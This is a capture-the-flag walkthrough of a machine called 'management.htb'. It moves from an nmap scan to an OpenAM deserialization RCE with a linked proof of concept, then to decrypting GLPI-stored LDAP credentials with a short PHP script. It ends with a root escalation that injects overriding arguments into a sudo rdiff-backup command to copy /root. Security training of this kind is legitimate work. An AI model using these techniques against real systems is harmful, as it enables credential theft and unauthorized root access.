# management

```
Nmap scan report for 10.129.2.150
Host is up, received echo-reply ttl 63 (0.068s latency).
Scanned at 2026-09-12 22:39:19 EDT for 92s
Not shown: 995 closed tcp ports (reset)
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp    open  http        syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://10.129.2.150/
443/tcp   open  ssl/http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://management.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=management.htb/organizationName=Management Managed Services Ltd
| Subject Alternative Name: DNS:management.htb, DNS:*.management.htb
| Issuer: commonName=management.htb/organizationName=Management Managed Services Ltd
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-02T01:21:44
| Not valid after:  2126-05-09T01:21:44
| MD5:     340b 4117 daca 4dc5 ba7e 6724 7406 4f09
| SHA-1:   2a4c d0c3 53fb 774f a3fe d6df 6e5f 0309 5911 670c
| SHA-256: 408e ab66 04ba 0d8c ae55 c9c7 6d7c 860f 03c1 72ea fff1 fa64 8322 bc04 ab63 23a8
| -----BEGIN CERTIFICATE-----
| MIIDlzCCAn+gAwIBAgIUFd8+MwDDYS1HjKuI8X5R7vL7oBcwDQYJKoZIhvcNAQEL
| BQAwQzEXMBUGA1UEAwwObWFuYWdlbWVudC5odGIxKDAmBgNVBAoMH01hbmFnZW1l
| bnQgTWFuYWdlZCBTZXJ2aWNlcyBMdGQwIBcNMjYwNjAyMDEyMTQ0WhgPMjEyNjA1
| MDkwMTIxNDRaMEMxFzAVBgNVBAMMDm1hbmFnZW1lbnQuaHRiMSgwJgYDVQQKDB9N
| YW5hZ2VtZW50IE1hbmFnZWQgU2VydmljZXMgTHRkMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEA4Ifdrz0nHuGG0rjZE/Vc0Hf1iHHR1mk9j2IQPnHBHuZK
| c+ofamIJwOA4LsYyxW4k2E8XiXx0UGZ5oc8v26zNCg3xNk8UmMDt9cpFtNou393v
| VAB0V8ZANNk0LAzja/kzq8MBtOmcmRfQyUnxbTep8MloOdHFQIxWK5Ok0ejGtg2b
| AHTWF+R3cs4XEzOR/u2dhbB6+yR1xxEBxYpSg7mb2yDXy754NFe1pWabrZQBXmVk
| 3RHsCLvsZaHS4djBXW5+G7h6NUcFT6ITxQICD20eFDT3R5G7TZ4/GAs8co2x2GpI
| VRUmlj+JEuqi8U7H6DUR9dLLqAoF0dGocQGPP639vQIDAQABo4GAMH4wHQYDVR0O
| BBYEFB0XvLYnvemOLJArfcYtqq9rkuSHMB8GA1UdIwQYMBaAFB0XvLYnvemOLJAr
| fcYtqq9rkuSHMA8GA1UdEwEB/wQFMAMBAf8wKwYDVR0RBCQwIoIObWFuYWdlbWVu
| dC5odGKCECoubWFuYWdlbWVudC5odGIwDQYJKoZIhvcNAQELBQADggEBACMea0UH
| omu+dhxnrcLZ0bxrzd5n8ZGnHucFQCtCuvKFira5FwcX+R9BGaPAVe43gzMpXwwn
| JoUWW36/QTkHC/eEu10xavgYXJsqZFG6g+rq3orVDrO37pU7ILHlIW5cITs073sw
| +DHHwcMTkvfvcqajO6nJYf/RL7NFISBvxSVBVmsWlRKj4av0qiKPeEchiWYMkxoA
| F0C80/WliBqw1c37G/acZTnh4gMKK+jE65EpAXDD6MZmoJ/pkSSPoOkv0Hi+RyCj
| NFHFNO8Y/Ut94WiUPMDS+jMnfK3+0elKEU831oJ9RMajVFu9P5n2KDIIaiaQ1VTw
| z1eFKtcjA8Ob2pE=
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
4444/tcp  open  ssl/krb524? syn-ack ttl 63
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=sso.management.htb/organizationName=Administration Connector RSA Self-Signed Certificate
| Issuer: commonName=sso.management.htb/organizationName=Administration Connector RSA Self-Signed Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-02T01:23:59
| Not valid after:  2046-05-28T01:23:59
| MD5:     f9f7 2d79 688a 7e18 848d 3c4a e5a7 928a
| SHA-1:   587d 40bb 52b3 4e25 fcf1 4237 8eda 45ad 7f9e 7e3f
| SHA-256: a213 911c 7e66 33ff b4d4 8daf 6a2e 1ab4 e535 4462 b798 19b4 626d 69b5 871d e591
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAiGgAwIBAgIJAIFW7GaOYtM6MA0GCSqGSIb3DQEBCwUAMFwxGzAZBgNV
| BAMMEnNzby5tYW5hZ2VtZW50Lmh0YjE9MDsGA1UECgw0QWRtaW5pc3RyYXRpb24g
| Q29ubmVjdG9yIFJTQSBTZWxmLVNpZ25lZCBDZXJ0aWZpY2F0ZTAeFw0yNjA2MDIw
| MTIzNTlaFw00NjA1MjgwMTIzNTlaMFwxGzAZBgNVBAMMEnNzby5tYW5hZ2VtZW50
| Lmh0YjE9MDsGA1UECgw0QWRtaW5pc3RyYXRpb24gQ29ubmVjdG9yIFJTQSBTZWxm
| LVNpZ25lZCBDZXJ0aWZpY2F0ZTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
| ggEBAKbUhh7nmQ/EAOdaHrUxKFnfyiNmPP7amMAHikYiJ2A3GtZ+PsSX+adZyOBP
| GvSpa/i9jiUdkLQ2VMCGH/RTu7QFBLYXqj8g2RmRWuyPYVeizWcOOURrCAVr0BZu
| hBqrlrU1kN4Rsmhx6vIBSEL0fM6bW/yFt8L0oc2jRDQPV7ufwger9TesK0KyhCz4
| WcR1LBCSe+DLFtPvYh+I4vAUp/CBaB4JUyzlhQscpVC/Pm2Yz0ZNLx4QXn9Mifg9
| 2Cre/pj0h+Uj8/H/ebAyusrz7E1ss2HLrYTdDpo3J4BNYNA5g2J+t/S7E7jLwQDX
| vOcp9hDP0CwN8l2RSw3EH69LD/MCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAZAaF
| Pw7cSMv1V2oedWG100naJt7hrd9TMzqGCV/KDl8vaG2ZCR//yhqsNKVHfxc8sSMH
| zMAEUA8T3wMheHQcwAnCKPHPkQmlvGtpZgsqPuMYNx4wwdDhLh8kcwtbDY4sJbwL
| mNrY7x6wovcrMcs74x4AhoxLkVJ8AQBNW3FcDp4GCtmORWhIfpzKhcrtc9zgEAdw
| dilIWPT688ZNQ3T+uPnw0VybpZTvO/PRKE2qidFZ/TTjsI7SK6CEWl09ayQKJcVW
| UAs4R66Vd/nLg+FxL18vpivyvDJIs0u8GEy3YuTKlK+mT+GVOY6F306n2EDrAbHL
| UOOjtnxeafnwwOSBnw==
|_-----END CERTIFICATE-----
| fingerprint-strings: 
|   LDAPSearchReq: 
|     0<0:
|     objectClass1+
|     ds-root-dse
|_    ds-cfg-root-dse-backend0
50389/tcp open  ldap        syn-ack ttl 63 (Anonymous bind OK)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4444-TCP:V=7.99%T=SSL%I=7%D=9/12%Time=6AA60D13%P=x86_64-pc-linux-gn
SF:u%r(LDAPSearchReq,55,"0E\x02\x01\x07d@\x04\x000<0:\x04\x0bobjectClass1\
SF:+\x04\x03top\x04\x0bds-root-dse\x04\x17ds-cfg-root-dse-backend0\x0c\x02
SF:\x01\x07e\x07\n\x01\0\x04\0\x04\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

interesing tls on 4444 and ldap on 50389

sso.management.htb + ldap ...

exploring the website, bunch of slop and a contact form. maybe worth looking at, we also get an email hello@management.htb

moving on to sso.management.htb reveals its running OpenAM, some identity management thing, that's definitely what's responsible for the ldap server. we can see the version `16.0.5` in the page source.

there is a preauth rce from a few months ago:

https://github.com/OpenIdentityPlatform/OpenAM/security/advisories/GHSA-2cqq-rpvq-g5qj

it's java deserialization. there was a similar one CVE-2021-35464 in which the `jato.pageSession` HTTP parameter was being unsafely deserialized. it was patched, but there is another parameter that gets deserialized and was missed by the patch that introduced the class whitelist, that parameter is `jato.clientSession`

the deserializtion is triggered when the jsp is rendered, specifically during the handling of `<jato:form>` tags. so the deserialization works for any page that contains them, which includes the password reset pages.

the advisory identifies a gadget chain from deserialization -> code exec that only uses built in openam classes/methods. there is a public poc [here](https://github.com/TheMalwareGuardian/CVE-2026-33439) that works, and it does exactly as described.

it's not a wonderful idea to use the jars supplied in that repo, so just pull them from maven instead.

## privesc

initial enumeration reveals one normal user with a shell `owen` that we should be attacking

/opt/backups/system looks interesting. perms locked down though

few interesting services running except openam+ldap, but also mysql..

there is a mgmt-backup script that runs nightly. interesting. cant read it.

i spent a while mucking around with the openam config and wasn't really getting anywhere

there is another app installed in /opt, glpi. it is not running, but it has plaintext creds for the db in its config:

```php
<?php
class DB extends DBmysql {
   public $dbhost = '127.0.0.1';
   public $dbuser = 'glpi';
   public $dbpassword = '...';
   public $dbdefault = 'glpidb';
   public $use_utf8mb4 = true;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```

which leads us into the gplidb.

first obv check is the glpi_users db, which has some hashes. i was able to crack `normal` and `tech`, but their passwords were just their names, indicating they are some default accounts

since the box is running openam, we can assume other services will be integrated with it, and openam uses ldap for the directory

there is another table glpi_authldaps and it contains a rootdn_password

```sql
select rootdn_passwd from glpi_authldaps;
```

it's a base64 encoded blob of 92 bytes. doesn't look like a hash, so it's probably encrypted

in the glpi source code, grepping for rootdn_password leads us to this GLPIKey class that's used to encrpyt and decrypt keys across GLPI. we can see it uses AEAD_xChaCha20Poly1305 from libsodium

glpi/src/GLPIKey.php
```php
    public function encrypt(string $string, ?string $key = null): string
    {
        if ($key === null) {
            $key = $this->get();
        }

        if ($key === null) {
            // Cannot encrypt string as key reading fails, returns a empty value
            // to ensure sensitive data is not propagated unencrypted.
            return '';
        }

        $nonce = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES); // NONCE = Number to be used ONCE, for each message
        $encrypted = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt(
            $string,
            $nonce,
            $nonce,
            $key
        );
        return base64_encode($nonce . $encrypted);
```

we can make our own script and use the same class to decrypt it, it just needs the config dir:

```php
<?php
  require_once("/opt/glpi/vendor/autoload.php");
  $enc = '...';
  $res = (new GLPIKey("/opt/glpi/config"))->decrypt($enc);
  fwrite(STDOUT, $res);
?>
```

which yields us a password that also works the the user `owen`

## root

checking `sudo -l` reveals we can run this rdiff-backup command with nopasswd as root, and we need to supply some arguments

rdiff-backup is a script for doing differential backups.

the `rdiff-backup` manpage indicates `--server` is used on the remote end of a connection to establish a pipe to read files. bc of the wildcard we also need to supply some args.

to take advantage of this we need to supply this command in the `--remote-schema` argument of an rdiff-backup command, it also has a `{h}` placeholder for the host info to use in the remote connection command.

notice the arg that restricts us to `/opt/backup`. and `--restrict-mode read-only`. that isn't very convenient. luckily we are allowed to inject our own arguments, so let's see what we can do

turns out you can just supply the same argument again, and your new value will override the old. therefore we can just `--restrict-path / --restrict-mode read-write` and get full filesystem access. this may just be how argparse works? not sure but it works

we don't need to use the `--user-mapping-file` arg or anything because our copied files will already be owned by `owen` anyway.

that means we can just backup `/root` and get the flag, also an ssh private key. we also could have written our own if there wasn't one.

```bash
rdiff-backup --remote-schema 'ssh -C {h} sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path / --restrict-mode read-write' owen@localhost::/root .
```


